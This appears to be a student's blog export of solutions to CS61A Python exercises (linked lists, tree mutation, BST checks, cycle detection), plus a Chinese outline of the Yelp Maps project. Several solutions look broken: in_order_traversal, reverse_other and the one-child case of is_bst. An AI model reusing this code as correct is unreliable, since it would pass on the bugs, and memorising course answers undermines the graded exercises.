<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">store_digits</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="string">"""Stores the digits of a positive number n in a linked list.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; s = store_digits(1)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; s</span></span><br><span class="line"><span class="string">    Link(1)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; store_digits(2345)</span></span><br><span class="line"><span class="string">    Link(2, Link(3, Link(4, Link(5))))</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; store_digits(876)</span></span><br><span class="line"><span class="string">    Link(8, Link(7, Link(6)))</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    l = Link.empty</span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        l = Link(n % <span class="number">10</span>, l)</span><br><span class="line">        n //= <span class="number">10</span></span><br><span class="line">    <span class="keyword">return</span> l</span><br></pre></td></tr></table></figure>

<h2 id="Q6-Cumulative-Sum"><a href="#Q6-Cumulative-Sum" class="headerlink" title="Q6: Cumulative Sum"></a>Q6: Cumulative Sum</h2><p>Write a function <code>cumulative_sum</code> that mutates the Tree <code>t</code> so that each node’s label becomes the sum of all labels in the subtree rooted at the node.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cumulative_sum</span><span class="params">(t)</span>:</span></span><br><span class="line">    <span class="string">"""Mutates t so that each node's label becomes the sum of all labels in</span></span><br><span class="line"><span class="string">    the corresponding subtree rooted at t.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; t = Tree(1, [Tree(3, [Tree(5)]), Tree(7)])</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; cumulative_sum(t)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; t</span></span><br><span class="line"><span class="string">    Tree(16, [Tree(8, [Tree(5)]), Tree(7)])</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> t.branches:</span><br><span class="line">        cumulative_sum(b)</span><br><span class="line">    t.label = sum([b.label <span class="keyword">for</span> b <span class="keyword">in</span> t.branches]) + t.label</span><br></pre></td></tr></table></figure>
<h1 id="Midterm-Review-required"><a href="#Midterm-Review-required" class="headerlink" title="Midterm Review (required)"></a>Midterm Review (required)</h1><h2 id="Q7-Is-BST"><a href="#Q7-Is-BST" class="headerlink" title="Q7: Is BST"></a>Q7: Is BST</h2><p>Write a function <code>is_bst</code>, which takes a Tree <code>t</code> and returns <code>True</code> if, and only if, <code>t</code> is a valid binary search tree, which means that:</p>
<ul>
<li>Each node has at most two children (a leaf is automatically a valid binary search tree)</li>
<li>The children are valid binary search trees</li>
<li>For every node, the entries in that node’s left child are less than or equal to the label of the node</li>
<li>For every node, the entries in that node’s right child are greater than the label of the node<br>Note that, if a node has only one child, that child could be considered either the left or right child. You should take this into consideration. <strong>Do not use the <code>BST</code> constructor or anything from the <code>BST</code> class.</strong></li>
</ul>
<p>Hint: It may be helpful to write helper functions <code>bst_min</code> and <code>bst_max</code> that return the minimum and maximum, respectively, of a Tree if it is a valid binary search tree.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_bst</span><span class="params">(t)</span>:</span></span><br><span class="line">    <span class="string">"""Returns True if the Tree t has the structure of a valid BST.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; t1 = Tree(6, [Tree(2, [Tree(1), Tree(4)]), Tree(7, [Tree(7), Tree(8)])])</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; is_bst(t1)</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; t2 = Tree(8, [Tree(2, [Tree(9), Tree(1)]), Tree(3, [Tree(6)]), Tree(5)])</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; is_bst(t2)</span></span><br><span class="line"><span class="string">    False</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; t3 = Tree(6, [Tree(2, [Tree(4), Tree(1)]), Tree(7, [Tree(7), Tree(8)])])</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; is_bst(t3)</span></span><br><span class="line"><span class="string">    False</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; t4 = Tree(1, [Tree(2, [Tree(3, [Tree(4)])])])</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; is_bst(t4)</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; t5 = Tree(1, [Tree(0, [Tree(-1, [Tree(-2)])])])</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; is_bst(t5)</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; t6 = Tree(1, [Tree(4, [Tree(2, [Tree(3)])])])</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; is_bst(t6)</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; t7 = Tree(2, [Tree(1, [Tree(5)]), Tree(4)])</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; is_bst(t7)</span></span><br><span class="line"><span class="string">    False</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">bst_max</span><span class="params">(t)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> t.is_leaf():</span><br><span class="line">            <span class="keyword">return</span> t.label</span><br><span class="line">        <span class="keyword">return</span> max(t.label, bst_max(t.branches[<span class="number">-1</span>]))</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">bst_min</span><span class="params">(t)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> t.is_leaf():</span><br><span class="line">            <span class="keyword">return</span> t.label</span><br><span class="line">        <span class="keyword">return</span> min(t.label, bst_min(t.branches[<span class="number">0</span>]))</span><br><span class="line">    <span class="keyword">if</span> t.is_leaf():</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> len(t.branches) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> is_bst(t.branches[<span class="number">0</span>]) <span class="keyword">and</span> (t.label &gt;= bst_min(t.branches[<span class="number">0</span>]) <span class="keyword">or</span> t.label &lt; bst_max(t.branches[<span class="number">0</span>]))</span><br><span class="line">    <span class="keyword">if</span> len(t.branches) == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> is_bst(t.branches[<span class="number">0</span>]) <span class="keyword">and</span> is_bst(t.branches[<span class="number">1</span>]) <span class="keyword">and</span> bst_max(t.branches[<span class="number">0</span>]) &lt;= t.label <span class="keyword">and</span> bst_min(t.branches[<span class="number">1</span>]) &gt; t.label</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<h2 id="Q8-In-order-traversal"><a href="#Q8-In-order-traversal" class="headerlink" title="Q8: In-order traversal"></a>Q8: In-order traversal</h2><p>Write a function that returns a generator that generates an “in-order” traversal, in which we yield the value of every node in order from left to right, assuming that each node has either 0 or 2 branches.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">in_order_traversal</span><span class="params">(t)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Generator function that generates an "in-order" traversal, in which we</span></span><br><span class="line"><span class="string">    yield the value of every node in order from left to right, assuming that each node has either 0 or 2 branches.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    For example, take the following tree t:</span></span><br><span class="line"><span class="string">            1</span></span><br><span class="line"><span class="string">        2       3</span></span><br><span class="line"><span class="string">    4     5</span></span><br><span class="line"><span class="string">         6  7</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    We have the in-order-traversal 4, 2, 6, 5, 7, 1, 3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; t = Tree(1, [Tree(2, [Tree(4), Tree(5, [Tree(6), Tree(7)])]), Tree(3)])</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; list(in_order_traversal(t))</span></span><br><span class="line"><span class="string">    [4, 2, 6, 5, 7, 1, 3]</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="keyword">if</span> t.is_leaf():</span><br><span class="line">        <span class="keyword">yield</span> t.label</span><br><span class="line">    <span class="keyword">yield</span> <span class="keyword">from</span> in_order_traversal(t.branches[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">yield</span> t.label</span><br><span class="line">    <span class="keyword">yield</span> <span class="keyword">from</span> in_order_traversal(t.branches[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>
<h1 id="Linked-List-Practice"><a href="#Linked-List-Practice" class="headerlink" title="Linked List Practice"></a>Linked List Practice</h1><h2 id="Q9-Remove-All"><a href="#Q9-Remove-All" class="headerlink" title="Q9: Remove All"></a>Q9: Remove All</h2><p>Implement a function <code>remove_all</code> that takes a <code>Link</code>, and a <code>value</code>, and remove any linked list node containing that value. You can assume the list already has at least one node containing <code>value</code> and the first element is never removed. Notice that you are not returning anything, so you should mutate the list.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_all</span><span class="params">(link , value)</span>:</span></span><br><span class="line">    <span class="string">"""Remove all the nodes containing value. Assume there exists some</span></span><br><span class="line"><span class="string">    nodes to be removed and the first element is never removed.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; l1 = Link(0, Link(2, Link(2, Link(3, Link(1, Link(2, Link(3)))))))</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print(l1)</span></span><br><span class="line"><span class="string">    &lt;0 2 2 3 1 2 3&gt;</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; remove_all(l1, 2)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print(l1)</span></span><br><span class="line"><span class="string">    &lt;0 3 1 3&gt;</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; remove_all(l1, 3)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print(l1)</span></span><br><span class="line"><span class="string">    &lt;0 1&gt;</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    p1, p2 = link, link.rest</span><br><span class="line">    <span class="keyword">while</span> p2 <span class="keyword">is</span> <span class="keyword">not</span> Link.empty:</span><br><span class="line">        <span class="keyword">if</span> p2.first == value:</span><br><span class="line">            p1.rest = p2.rest</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p1 = p1.rest</span><br><span class="line">        p2 = p2.rest</span><br></pre></td></tr></table></figure>
<p><span style="color:red">The pdf solution</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_all</span><span class="params">(link , value)</span>:</span></span><br><span class="line">    <span class="string">"""Remove all the nodes containing value. Assume there exists some</span></span><br><span class="line"><span class="string">    nodes to be removed and the first element is never removed.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; l1 = Link(0, Link(2, Link(2, Link(3, Link(1, Link(2, Link(3)))))))</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print(l1)</span></span><br><span class="line"><span class="string">    &lt;0 2 2 3 1 2 3&gt;</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; remove_all(l1, 2)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print(l1)</span></span><br><span class="line"><span class="string">    &lt;0 3 1 3&gt;</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; remove_all(l1, 3)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print(l1)</span></span><br><span class="line"><span class="string">    &lt;0 1&gt;</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> link <span class="keyword">is</span> Link.empty <span class="keyword">or</span> link.rest <span class="keyword">is</span> Link.empty:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> link.rest.first == value:</span><br><span class="line">        link.rest = link.rest.rest</span><br><span class="line">        remove_all(link, value)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        remove_all(link.rest, value)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># alternate solution</span></span><br><span class="line">    <span class="keyword">if</span> link <span class="keyword">is</span> <span class="keyword">not</span> Link.empty <span class="keyword">and</span> link.rest <span class="keyword">is</span> <span class="keyword">not</span> Link.empty:</span><br><span class="line">        remove_all(link.rest, value)</span><br><span class="line">        <span class="keyword">if</span> link.rest.first == value:</span><br><span class="line">            link.rest = link.rest.rest</span><br></pre></td></tr></table></figure>
<p>Video walkthrough: <a href="https://youtu.be/hdO9Ry8d5FU?t=39m33s" target="_blank" rel="noopener">https://youtu.be/hdO9Ry8d5FU?t=39m33s</a></p>
<h2 id="Q10-Mutable-Mapping"><a href="#Q10-Mutable-Mapping" class="headerlink" title="Q10: Mutable Mapping"></a>Q10: Mutable Mapping</h2><p>Implement <code>deep_map_mut(fn, link)</code>, which applies a function <code>fn</code> onto all elements in the given linked list <code>link</code>. If an element is itself a linked list, apply <code>fn</code> to each of its elements, and so on.</p>
<p>Your implementation should mutate the original linked list. Do not create any new linked lists.</p>
<p>Hint: The built-in <code>isinstance</code> function may be useful.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; s &#x3D; Link(1, Link(2, Link(3, Link(4))))</span><br><span class="line">&gt;&gt;&gt; isinstance(s, Link)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; isinstance(s, int)</span><br><span class="line">False</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deep_map_mut</span><span class="params">(fn, link)</span>:</span></span><br><span class="line">    <span class="string">"""Mutates a deep link by replacing each item found with the result of calling fn on the item.  Does NOT create new Links (so no use of Link's constructor)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Does not return the modified Link object.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; link1 = Link(3, Link(Link(4), Link(5, Link(6))))</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; deep_map_mut(lambda x: x * x, link1)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print(link1)</span></span><br><span class="line"><span class="string">    &lt;9 &lt;16&gt; 25 36&gt;</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="keyword">if</span> link <span class="keyword">is</span> Link.empty:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">elif</span> isinstance(link.first, Link):</span><br><span class="line">        deep_map_mut(fn, link.first)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        link.first = fn(link.first)</span><br><span class="line">    deep_map_mut(fn, link.rest)</span><br></pre></td></tr></table></figure>
<h2 id="Q11-Cycles"><a href="#Q11-Cycles" class="headerlink" title="Q11: Cycles"></a>Q11: Cycles</h2><p>The <code>Link</code> class can represent lists with cycles. That is, a list may contain itself as a sublist.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; s &#x3D; Link(1, Link(2, Link(3)))</span><br><span class="line">&gt;&gt;&gt; s.rest.rest.rest &#x3D; s</span><br><span class="line">&gt;&gt;&gt; s.rest.rest.rest.rest.rest.first</span><br><span class="line">3</span><br></pre></td></tr></table></figure>
<p>Implement <code>has_cycle</code>,that returns whether its argument, a <code>Link</code> instance, contains a cycle.</p>
<p>Hint: Iterate through the linked list and try keeping track of which <code>Link</code> objects you’ve already seen.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">has_cycle</span><span class="params">(link)</span>:</span></span><br><span class="line">    <span class="string">"""Return whether link contains a cycle.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; s = Link(1, Link(2, Link(3)))</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; s.rest.rest.rest = s</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; has_cycle(s)</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; t = Link(1, Link(2, Link(3)))</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; has_cycle(t)</span></span><br><span class="line"><span class="string">    False</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; u = Link(2, Link(2, Link(2)))</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; has_cycle(u)</span></span><br><span class="line"><span class="string">    False</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="keyword">if</span> link <span class="keyword">is</span> Link.empty:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        slow = link</span><br><span class="line">        fast = link.rest</span><br><span class="line">        <span class="keyword">while</span> fast <span class="keyword">is</span> <span class="keyword">not</span> Link.empty:</span><br><span class="line">            <span class="keyword">if</span> fast.rest <span class="keyword">is</span> Link.empty:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            slow = slow.rest</span><br><span class="line">            fast = fast.rest.rest</span><br><span class="line">            <span class="keyword">if</span> slow <span class="keyword">is</span> fast:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<p><span style = "color:red">The pdf solution</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">has_cycle</span><span class="params">(link)</span>:</span></span><br><span class="line">    <span class="string">"""Return whether link contains a cycle.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; s = Link(1, Link(2, Link(3)))</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; s.rest.rest.rest = s</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; has_cycle(s)</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; t = Link(1, Link(2, Link(3)))</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; has_cycle(t)</span></span><br><span class="line"><span class="string">    False</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; u = Link(2, Link(2, Link(2)))</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; has_cycle(u)</span></span><br><span class="line"><span class="string">    False</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    links = []</span><br><span class="line">    <span class="keyword">while</span> link <span class="keyword">is</span> <span class="keyword">not</span> Link.empty:</span><br><span class="line">        <span class="keyword">if</span> link <span class="keyword">in</span> links:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        links.append(link)</span><br><span class="line">        link = link.rest</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<p>As an extra challenge, implement <code>has_cycle_constant</code> with only constant space. (If you followed the hint above, you will use linear space.) The solution is short (less than 20 lines of code), but requires a clever idea. Try to discover the solution yourself before asking around:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">has_cycle_constant</span><span class="params">(link)</span>:</span></span><br><span class="line">    <span class="string">"""Return whether link contains a cycle.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; s = Link(1, Link(2, Link(3)))</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; s.rest.rest.rest = s</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; has_cycle_constant(s)</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; t = Link(1, Link(2, Link(3)))</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; has_cycle_constant(t)</span></span><br><span class="line"><span class="string">    False</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="keyword">if</span> link <span class="keyword">is</span> Link.empty:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    slow, fast = link, link.rest</span><br><span class="line">    <span class="keyword">while</span> fast <span class="keyword">is</span> <span class="keyword">not</span> Link.empty:</span><br><span class="line">        <span class="keyword">if</span> fast.rest == Link.empty:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">elif</span> fast <span class="keyword">is</span> slow <span class="keyword">or</span> fast.rest <span class="keyword">is</span> slow:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            slow, fast = slow.rest, fast.rest.rest</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<p>This solution of this problem seems to be like my solution above.</p>
<h1 id="Tree-Practice"><a href="#Tree-Practice" class="headerlink" title="Tree Practice"></a>Tree Practice</h1><h2 id="Q12-Reverse-Other"><a href="#Q12-Reverse-Other" class="headerlink" title="Q12: Reverse Other"></a>Q12: Reverse Other</h2><p>Write a function <code>reverse_other</code> that mutates the tree such that <strong>labels</strong> on every other (odd-depth) level are reversed. For example, <code>Tree(1,[Tree(2, [Tree(4)]), Tree(3)])</code> becomes <code>Tree(1,[Tree(3, [Tree(4)]), Tree(2)])</code>. Notice that the nodes themselves are not reversed; only the labels are.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse_other</span><span class="params">(t)</span>:</span></span><br><span class="line">    <span class="string">"""Mutates the tree such that nodes on every other (odd-depth) level have the labels of their branches all reversed.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; t = Tree(1, [Tree(2), Tree(3), Tree(4)])</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; reverse_other(t)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; t</span></span><br><span class="line"><span class="string">    Tree(1, [Tree(4), Tree(3), Tree(2)])</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; t = Tree(1, [Tree(2, [Tree(3, [Tree(4), Tree(5)]), Tree(6, [Tree(7)])]), Tree(8)])</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; reverse_other(t)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; t</span></span><br><span class="line"><span class="string">    Tree(1, [Tree(8, [Tree(3, [Tree(5), Tree(4)]), Tree(6, [Tree(7)])]), Tree(2)])</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverse_helper</span><span class="params">(t, need_reverse)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> t.is_leaf():</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        new_labs = [b.label <span class="keyword">for</span> b <span class="keyword">in</span> t.branches][::<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(b.branches)):</span><br><span class="line">            reverse_helper(b.branches[i], <span class="keyword">not</span> need_reverse)</span><br><span class="line">            <span class="keyword">if</span> need_reverse:</span><br><span class="line">                b.branches[i].label = new_labs[i]</span><br><span class="line">    reverse_helper(t, <span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CS61A</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>SICP</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61a-lab08</title>
    <url>/2018/10/30/cs61a-lab08/</url>
    <content><![CDATA[<h1 id="Linked-Lists"><a href="#Linked-Lists" class="headerlink" title="Linked Lists"></a>Linked Lists</h1><h2 id="Q1-Deep-Linked-List-Length"><a href="#Q1-Deep-Linked-List-Length" class="headerlink" title="Q1: Deep Linked List Length"></a>Q1: Deep Linked List Length</h2><p>A linked list that contains one or more linked lists as elements is called a deep linked list. Write a function <code>deep_len</code> that takes in a (possibly deep) linked list and returns the deep length of that linked list. The deep length of a linked list is the total number of non-link elements in the list, as well as the total number of elements contained in all contained lists. See the function’s doctests for examples of the deep length of linked lists.</p>
<p>Hint: Use <code>isinstance</code> to check if something is an instance of an object.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deep_len</span><span class="params">(lnk)</span>:</span></span><br><span class="line">    <span class="string">""" Returns the deep length of a possibly deep linked list.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; deep_len(Link(1, Link(2, Link(3))))</span></span><br><span class="line"><span class="string">    3</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; deep_len(Link(Link(1, Link(2)), Link(3, Link(4))))</span></span><br><span class="line"><span class="string">    4</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; levels = Link(Link(Link(1, Link(2)), \</span></span><br><span class="line"><span class="string">            Link(3)), Link(Link(4), Link(5)))</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print(levels)</span></span><br><span class="line"><span class="string">    &lt;&lt;&lt;1 2&gt; 3&gt; &lt;4&gt; 5&gt;</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; deep_len(levels)</span></span><br><span class="line"><span class="string">    5</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="keyword">if</span> lnk <span class="keyword">is</span> Link.empty:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> isinstance(lnk, Link):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> deep_len(lnk.first) + deep_len(lnk.rest)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CS61A</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>SICP</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61a-proj02</title>
    <url>/2018/09/05/cs61a-proj02/</url>
    <content><![CDATA[<h1 id="Yelp-Maps"><a href="#Yelp-Maps" class="headerlink" title="Yelp Maps"></a>Yelp Maps</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li><p>目的：运用机器学习和Yelp学术数据集创建餐馆评分可视化界面</p>
</li>
<li><p>描述：Berkeley被划分成不同的区域，每个区域由最近的餐厅的预测评分被描画出不同颜色的阴影，黄色是5星，蓝色是一星。每一个点代表一个餐厅，并且其颜色由所在位置决定。比如：市中心的餐厅是绿色的。</p>
<a id="more"></a>
<h2 id="阶段0-工具函数"><a href="#阶段0-工具函数" class="headerlink" title="阶段0: 工具函数"></a>阶段0: 工具函数</h2></li>
<li><p>问题0.1：用list comprehensions并且只用一行代码实现map_and_filter函数，接受序列s，一个参数的函数map_fn，一个参数的函数filter_fn，返回一个新list包含filter为true并且调用map_fn在每一个参数上</p>
</li>
<li><p>问题0.2：用min函数实现key_of_min_value,接受一个字典，返回一个key，这个key对应value的最小值。</p>
</li>
<li><p>问题0.3：用zip函数实现enumerate，接受一个序列s和一个开始索引，返回一个pairs的list，第i个元素是i+start和s的第i个元素。</p>
</li>
<li><p>问题1:实现mean函数求序列平均数，断言序列不为空，接受一个序列返回其平均数</p>
</li>
</ul>
<h2 id="阶段1：数据抽象"><a href="#阶段1：数据抽象" class="headerlink" title="阶段1：数据抽象"></a>阶段1：数据抽象</h2><ul>
<li><p>问题2：为餐厅构造器和选择器实现数据抽象，review和user已实现。</p>
</li>
<li><p>结构剖析：整个项目由三部分数据抽象组成，分别是User，Review和Restaurant，三种数据抽象都有对应的make_xxx来实例化一个新实例，接下来分别分析这三部分</p>
</li>
<li><p>Review这个抽象底层由list实现，并且review通过两个参数新生成一个实例，分别是餐厅的名字和评分，数据类型对应str和float，并有与之对应的选择器选择其成员即restaurant_name和rating</p>
</li>
<li><p>User这个抽象底层依然由list实现，但是其接受两个参数，分别是用户名name以及一个对应的reviews列表，这个reviews列表由一系列的上述review组合而成，而User的实现就是将这些个reviews用list comprehension的方式在底层转为字典，以餐厅名字：review实例一个个键值对的方式将其存储在列表的第一项中。而列表实现的第0项就是用户名，然后存在与之对应的选择器去实现user_name和user_reviews的获取。</p>
</li>
